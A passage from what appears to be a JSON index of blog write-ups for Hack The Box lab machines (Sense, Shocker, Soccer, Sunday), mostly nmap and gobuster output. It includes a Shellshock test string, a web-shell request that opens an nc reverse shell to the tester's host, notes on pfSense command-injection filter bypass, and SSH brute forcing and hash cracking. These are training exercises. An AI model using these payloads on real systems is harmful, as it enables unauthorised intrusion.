tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4f8ade8f80477decf150d630a187e49 (RSA) | 256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA) |_ 256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.","tags":["HTB","sudo","cve-2015-6967"],"title":"[HTB] Machine: Nibbles"},{"categories":null,"contents":"Sense Enumeration nmap └─$ nmap -sC -sV 10.10.10.60 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 16:21 BST Nmap scan report for 10.10.10.60 (10.10.10.60) Host is up (0.11s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http lighttpd 1.4.35 |_http-server-header: lighttpd/1.4.35 |_http-title: Did not follow redirect to https://10.10.10.60/ 443/tcp open ssl/http lighttpd 1.4.35 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US | Not valid before: 2017-10-14T19:21:35 |_Not valid after: 2023-04-06T19:21:35 |_http-title: Login |_http-server-header: lighttpd/1.4.35 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.55 seconds d └─$ gobuster dir -u https://10.10.10.60/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt -k =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://10.10.10.60/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/06/09 16:46:37 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 6690] /help.php (Status: 200) [Size: 6689] /themes (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/themes/] /stats.php (Status: 200) [Size: 6690] /css (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/css/] /edit.php (Status: 200) [Size: 6689] /includes (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/includes/] /license.php (Status: 200) [Size: 6692] /system.php (Status: 200) [Size: 6691] /status.php (Status: 200) [Size: 6691] /javascript (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/javascript/] /changelog.txt (Status: 200) [Size: 271] /classes (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/classes/] /exec.php (Status: 200) [Size: 6689] /widgets (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/widgets/] /graph.php (Status: 200) [Size: 6690] /tree (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/tree/] /wizard.php (Status: 200) [Size: 6691] /shortcuts (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/shortcuts/] /pkg.php (Status: 200) [Size: 6688] /installer (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/installer/] /wizards (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/wizards/] /xmlrpc.php (Status: 200) [Size: 384] /reboot.php (Status: 200) [Size: 6691] /interfaces.php (Status: 200) [Size: 6695] /csrf (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/csrf/] /system-users.txt (Status: 200) [Size: 106] /filebrowser (Status: 301) [Size: 0] [--\u0026gt; https://10.10.10.60/filebrowser/] Login page We see system-users.txt and changelog.txt files Let\u0026rsquo;s check them Foothold/User/Root So based on the notes, we can try rohit:pfsense And we get an access We see the version of the pfsense Googling for the exploits and vulnerabilities resulted in this blog Let\u0026rsquo;s try manually exploit the vulnerability Let\u0026rsquo;s nagivate to vulnerable path Let\u0026rsquo;s test the RCE Success If we carefully read the blog we can see that there are bad chars that we can\u0026rsquo;t use for our payload / and - So we have to find a way to bypass the limitation We can check env and use one of the variables Like HOME which contains / Now we need a - Here we can use printf and use octal representation of -, which is \\55 I didn\u0026rsquo;t try hex or decimal representation, but I think hex should work too \\x2d Let\u0026rsquo;s test it So tried different reverse shell one liners, but had no success Thus, I saw a technique, where you supply a payload to nc and wait for connection Then from target host connect to attack host and pipe the result to interpreter which will execute the payload And we get our root ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/sense/images/sense.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/sense/","summary":"Sense Enumeration nmap └─$ nmap -sC -sV 10.10.10.60 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 16:21 BST Nmap scan report for 10.10.10.60 (10.10.10.60) Host is up (0.11s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http lighttpd 1.4.35 |_http-server-header: lighttpd/1.4.35 |_http-title: Did not follow redirect to https://10.10.10.60/ 443/tcp open ssl/http lighttpd 1.4.35 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US | Not valid before: 2017-10-14T19:21:35 |_Not valid after: 2023-04-06T19:21:35 |_http-title: Login |_http-server-header: lighttpd/1.","tags":["HTB","pfsense","searchsploit","command-injection","cve-2016-10709"],"title":"[HTB] Machine: Sense"},{"categories":null,"contents":"Shocker Enumeration nmap └─$ nmap -sC -sV 10.10.10.56 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 20:39 BST Nmap scan report for 10.10.10.56 (10.10.10.56) Host is up (0.15s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). 2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4f8ade8f80477decf150d630a187e49 (RSA) | 256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA) |_ 256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.10 seconds gobuster the option -f is important, since it will Append / to each request I wasn\u0026rsquo;t able to find anything without that option └─$ gobuster dir -u http://10.10.10.56/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -f =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.56/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Add Slash: true [+] Timeout: 10s =============================================================== 2023/06/10 05:47:40 Starting gobuster in directory enumeration mode =============================================================== /cgi-bin/ (Status: 403) [Size: 294] /icons/ (Status: 403) [Size: 292] /server-status/ (Status: 403) [Size: 300] Let\u0026rsquo;s check the content of the cgi-bin └─$ gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -t 50 -x sh,cgi,pl =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.56/cgi-bin/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: sh,cgi,pl [+] Timeout: 10s =============================================================== 2023/06/10 06:09:48 Starting gobuster in directory enumeration mode =============================================================== /.html.cgi (Status: 403) [Size: 303] /.html.pl (Status: 403) [Size: 302] /.html (Status: 403) [Size: 299] /.html.sh (Status: 403) [Size: 302] /user.sh (Status: 200) [Size: 118] /.htm (Status: 403) [Size: 298] /.htm.cgi (Status: 403) [Size: 302] /.htm.pl (Status: 403) [Size: 301] /.htm.sh (Status: 403) [Size: 301] /. (Status: 403) [Size: 294] /.htaccess (Status: 403) [Size: 303] ... We found user.sh Foothold/User The name of the suggest the Shellshock, CVE-2014-6271 https://en.wikipedia.org/wiki/Shellshock_(software_bug) env x='() { :;}; echo vulnerable' bash -c \u0026quot;echo this is a test\u0026quot; User-Agent header is usually the target We can also test other headers: Cookie, Referer We use echo; to receive response back from server, but RCE still exists without it You can try () { :;}; /bin/ping -c1 10.10.16.3 You will not receive http-response, but will receive ping Notice that we have to use full path of the binary for execution Let\u0026rsquo;s get a reverse shell Root Enumeration for privesc sudo -l GTFOBins Rooted ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/shocker/images/shocker.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/shocker/","summary":"Shocker Enumeration nmap └─$ nmap -sC -sV 10.10.10.56 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 20:39 BST Nmap scan report for 10.10.10.56 (10.10.10.56) Host is up (0.15s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). 2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4f8ade8f80477decf150d630a187e49 (RSA) | 256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA) |_ 256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed.","tags":["HTB","cgi","shellshock","bashbug","cve-2014-6271","gtfobin"],"title":"[HTB] Machine: Shocker"},{"categories":null,"contents":"Soccer Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -p22,80,9091 -sC -sV 10.10.11.194 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-15 11:38 EDT Nmap scan report for www.soccer.htb (10.10.11.194) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ad0d84a3fdcc98a478fef94915dae16d (RSA) | 256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA) |_ 256 5797565def793c2fcbdb35fff17c615c (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://soccer.htb/ 9091/tcp open xmltec-xmlmail? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: | HTTP/1.1 400 Bad Request | Connection: close | GetRequest: | HTTP/1.1 404 Not Found | Content-Security-Policy: default-src \u0026#39;none\u0026#39; | X-Content-Type-Options: nosniff | Content-Type: text/html; charset=utf-8 | Content-Length: 139 | Date: Mon, 15 May 2023 15:38:17 GMT | Connection: close | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Error\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;pre\u0026gt;Cannot GET /\u0026lt;/pre\u0026gt; | \u0026lt;/body\u0026gt; | \u0026lt;/html\u0026gt; | HTTPOptions, RTSPRequest: | HTTP/1.1 404 Not Found | Content-Security-Policy: default-src \u0026#39;none\u0026#39; | X-Content-Type-Options: nosniff | Content-Type: text/html; charset=utf-8 | Content-Length: 143 | Date: Mon, 15 May 2023 15:38:18 GMT | Connection: close | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Error\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;pre\u0026gt;Cannot OPTIONS /\u0026lt;/pre\u0026gt; | \u0026lt;/body\u0026gt; |_ \u0026lt;/html\u0026gt; 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9091-TCP:V=7.93%I=7%D=5/15%Time=646251FC%P=x86_64-pc-linux-gnu%r(in SF:formix,2F,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r SF:\\n\\r\\n\u0026#34;)%r(drda,2F,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x SF:20close\\r\\n\\r\\n\u0026#34;)%r(GetRequest,168,\u0026#34;HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\ SF:nContent-Security-Policy:\\x20default-src\\x20\u0026#39;none\u0026#39;\\r\\nX-Content-Type-Op SF:tions:\\x20nosniff\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nCo SF:ntent-Length:\\x20139\\r\\nDate:\\x20Mon,\\x2015\\x20May\\x202023\\x2015:38:17\\ SF:x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x20html\u0026gt;\\n\u0026lt;html\\x20lang SF:=\\\u0026#34;en\\\u0026#34;\u0026gt;\\n\u0026lt;head\u0026gt;\\n\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\u0026lt;title\u0026gt;Error\u0026lt;/title\u0026gt;\\n\u0026lt;/ SF:head\u0026gt;\\n\u0026lt;body\u0026gt;\\n\u0026lt;pre\u0026gt;Cannot\\x20GET\\x20/\u0026lt;/pre\u0026gt;\\n\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n\u0026#34;)%r(HT SF:TPOptions,16C,\u0026#34;HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nContent-Security-Pol SF:icy:\\x20default-src\\x20\u0026#39;none\u0026#39;\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\n SF:Content-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20143\\ SF:r\\nDate:\\x20Mon,\\x2015\\x20May\\x202023\\x2015:38:18\\x20GMT\\r\\nConnection: SF:\\x20close\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x20html\u0026gt;\\n\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\\n\u0026lt;head\u0026gt;\\n\u0026lt;me SF:ta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\u0026lt;title\u0026gt;Error\u0026lt;/title\u0026gt;\\n\u0026lt;/head\u0026gt;\\n\u0026lt;body\u0026gt;\\n\u0026lt;pre\u0026gt;C SF:annot\\x20OPTIONS\\x20/\u0026lt;/pre\u0026gt;\\n\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n\u0026#34;)%r(RTSPRequest,16C,\u0026#34;HT SF:TP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nContent-Security-Policy:\\x20default-s SF:rc\\x20\u0026#39;none\u0026#39;\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\nContent-Type:\\x20 SF:text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20143\\r\\nDate:\\x20Mon,\\ SF:x2015\\x20May\\x202023\\x2015:38:18\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n SF:\u0026lt;!DOCTYPE\\x20html\u0026gt;\\n\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\\n\u0026lt;head\u0026gt;\\n\u0026lt;meta\\x20charset=\\\u0026#34;u SF:tf-8\\\u0026#34;\u0026gt;\\n\u0026lt;title\u0026gt;Error\u0026lt;/title\u0026gt;\\n\u0026lt;/head\u0026gt;\\n\u0026lt;body\u0026gt;\\n\u0026lt;pre\u0026gt;Cannot\\x20OPTIONS\\ SF:x20/\u0026lt;/pre\u0026gt;\\n\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n\u0026#34;)%r(RPCCheck,2F,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad SF:\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;)%r(DNSVersionBindReqTCP,2F SF:,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;)% SF:r(DNSStatusRequestTCP,2F,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnect SF:ion:\\x20close\\r\\n\\r\\n\u0026#34;)%r(Help,2F,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r SF:\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;)%r(SSLSessionReq,2F,\u0026#34;HTTP/1\\.1\\x20400\\x SF:20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 31.90 seconds gobuster ┌──(kali㉿kali)-[~] └─$ gobuster dir -u http://soccer.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://soccer.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/05/15 11:42:17 Starting gobuster in directory enumeration mode =============================================================== /tiny (Status: 301) [Size: 178] [--\u0026gt; http://soccer.htb/tiny/] Progress: 20713 / 26585 (77.91%)[ERROR] 2023/05/15 11:47:19 [!] parse \u0026#34;http://soccer.htb/error\\x1f_log\u0026#34;: net/url: invalid control character in URL Progress: 26570 / 26585 (99.94%) =============================================================== 2023/05/15 11:48:36 Finished =============================================================== Web Server Foothold Let\u0026rsquo;s try default credentials since we know the application running Let\u0026rsquo;s try uploading file with php extension to get rce It seems like there is a cleanup job, that deletes/moves the uploaded files Thus, I tried adding web shell to existing files But had no success, because the changes were reverted back So now we have a approximately 1 minute window to upload and get our reverse shell before our file gets deleted Prepared payload request beforehand: GET /tiny/uploads/shell.php?cmd=rm+-f+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2\u0026gt;%261|nc+10.10.16.37+6666+\u0026gt;/tmp/f Upload php file and send our request And we get our foothold User Now let\u0026rsquo;s enumerate Let\u0026rsquo;s use linpeas Nothing interesting was found, except another vhost Let\u0026rsquo;s add it to our /etc/hosts and open it Let\u0026rsquo;s check it We see that there are websockets involved in ticket input form So I played around with few basic sqli, but no success I can try using sqlmap but have no idea how to send requests to websocket Luckily there is a great blog about it Thanks to rayhan0x01 Check his blog out Now we can use sqlmap Use the creds dumped by sqlmap and we have our user Root If you ran linpeas before, you probably saw doas binary If search for it\u0026rsquo;s config, you will find that it has permissions for player to run dstat as root Check GTFOBins And get your root ","date":"June 7, 2023","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/soccer/","summary":"Soccer Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -p22,80,9091 -sC -sV 10.10.11.194 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-15 11:38 EDT Nmap scan report for www.soccer.htb (10.10.11.194) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ad0d84a3fdcc98a478fef94915dae16d (RSA) | 256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA) |_ 256 5797565def793c2fcbdb35fff17c615c (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://soccer.","tags":["HTB","subdomain","vhosts","express","ubuntu","tiny-file-manager","upload","webshell","php","websocket","sqli","websocket-sqli","boolean-based-sqli","sqlmap","doas","dstat"],"title":"[HTB] Machine: Soccer"},{"categories":null,"contents":"Sunday Enumeration nmap └─$ nmap -sT -p- -Pn --min-rate 5000 10.10.10.76 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 13:09 BST Warning: 10.10.10.76 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.76 (10.10.10.76) Host is up (0.094s latency). Not shown: 63025 filtered tcp ports (no-response), 2505 closed tcp ports (conn-refused) PORT STATE SERVICE 79/tcp open finger 111/tcp open rpcbind 515/tcp open printer 6787/tcp open smc-admin 22022/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 142.50 seconds └─$ nmap -sC -sV -p79,111,515,6787,22022 10.10.10.76 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 13:37 BST Nmap scan report for 10.10.10.76 (10.10.10.76) Host is up (0.16s latency). PORT STATE SERVICE VERSION 79/tcp open finger? | fingerprint-strings: | GenericLines: | No one logged on | GetRequest: | Login Name TTY Idle When Where | HTTP/1.0 ??? | HTTPOptions: | Login Name TTY Idle When Where | HTTP/1.0 ??? | OPTIONS ??? | Help: | Login Name TTY Idle When Where | HELP ??? | RTSPRequest: | Login Name TTY Idle When Where | OPTIONS ??? | RTSP/1.0 ??? | SSLSessionReq, TerminalServerCookie: |_ Login Name TTY Idle When Where |_finger: No one logged on\\x0D 111/tcp open rpcbind 2-4 (RPC #100000) 515/tcp open printer 6787/tcp open ssl/http Apache httpd 2.4.33 ((Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14) | tls-alpn: |_ http/1.1 |_http-server-header: Apache/2.4.33 (Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=sunday | Subject Alternative Name: DNS:sunday | Not valid before: 2021-12-08T19:40:00 |_Not valid after: 2031-12-06T19:40:00 | http-title: Solaris Dashboard |_Requested resource was https://10.10.10.76:6787/solaris/ 22022/tcp open ssh OpenSSH 7.5 (protocol 2.0) | ssh-hostkey: | 2048 aa0094321860a4933b87a4b6f802680e (RSA) |_ 256 da2a6cfa6bb1ea161da654a10b2bee48 (ED25519) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port79-TCP:V=7.93%I=7%D=6/10%Time=64846E88%P=x86_64-pc-linux-gnu%r(Gene SF:ricLines,12,\u0026#34;No\\x20one\\x20logged\\x20on\\r\\n\u0026#34;)%r(GetRequest,93,\u0026#34;Login\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x2 SF:0\\x20When\\x20\\x20\\x20\\x20Where\\r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nGET\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\ SF:?\\r\\nHTTP/1\\.0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:?\\?\\?\\r\\n\u0026#34;)%r(Help,5D,\u0026#34;Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\r\\nHELP\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\?\\?\\?\\r\\n\u0026#34;)%r(HTTPOptions,93,\u0026#34;Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\ SF:r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nHTTP/1\\.0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nOPTIONS\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n\u0026#34;)%r(RTSPRequest,93,\u0026#34;Login\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x2 SF:0When\\x20\\x20\\x20\\x20Where\\r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nOPTIONS\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nRTSP/1\\.0\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n\u0026#34;)%r(SS SF:LSessionReq,5D,\u0026#34;Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\r\\n\\x16\\x03\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\?\\?\\?\\r\\n\u0026#34;)%r(TerminalServerCookie,5D,\u0026#34;Login\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20 SF:\\x20\\x20Where\\r\\n\\x03\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 108.42 seconds Web Server We have a finger service, we can try enumerating users Foothold Let\u0026rsquo;s try bruteforcing ssh, since I had no idea where to check next Guess the password or use hydra We\u0026rsquo;re in, the creds are sunny:sunday User Let\u0026rsquo;s enumerate for privesc We have another user: sammy And we have a /backup folder with shadow file Let\u0026rsquo;s crack hashes using hashcat And we have our creds for sammy Root Enumerate for privesc sudo -l Check GTFOBins Rooted ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/sunday/images/sunday.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/sunday/","summary":"Sunday Enumeration nmap └─$ nmap -sT -p- -Pn --min-rate 5000 10.10.10.76 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 13:09 BST Warning: 10.10.10.76 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.76 (10.10.10.76) Host is up (0.094s latency). Not shown: 63025 filtered tcp ports (no-response), 2505 closed tcp ports (conn-refused) PORT STATE SERVICE 79/tcp open finger 111/tcp open rpcbind 515/tcp open printer 6787/tcp open smc-admin 22022/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 142.","tags":["HTB","finger","hashcat","sudo","shadow","sudoers","gtfobins","arbitrary-write"],"title":"[HTB] Machine: 